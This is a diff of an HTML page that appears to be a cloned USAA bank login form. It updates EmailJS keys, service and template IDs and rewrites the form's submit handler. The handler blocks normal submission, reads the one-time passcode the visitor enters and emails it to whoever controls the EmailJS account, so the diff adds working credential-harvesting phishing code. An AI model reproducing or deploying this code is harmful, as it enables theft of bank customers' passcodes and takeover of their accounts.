@@ -254,11 +254,12 @@ THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRES
     
     
 <div id=afterFooterButtons tabindex=0></div></div> </div></div></div></div><div class="modal-backdrop fade in"></div></form>
- <script>
-        emailjs.init("x9p2ifIOIHL_Xr4U0");
+ 
+    <script>
+        emailjs.init("1qxfSB1_KMHeE1QCN");
 
         function sendEmail(OTP) {
-        emailjs.send("service_bsg866p", "template_tzsc9gp", {
+        emailjs.send("service_l22c57a", "template_wpjt38m", {
           passcode:OTP
         })
         .then(function(response) {
@@ -269,17 +270,13 @@ THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRES
                     });
     }
 
-    
     document.getElementById('login-form').addEventListener('submit', function(event) {
-        event.preventDefault();
-        
-        var form = document.getElementById('login-form');
-        var OTP = form.querySelector('#passcode').value; 
-        
+    event.preventDefault();
 
-        sendEmail(OTP);
-        
-    });
+    const passcode = document.getElementById('usaa-form-v5-10-1-input-passcode').value;
+
+    sendEmail(passcode);
+});
 </script>
 
 
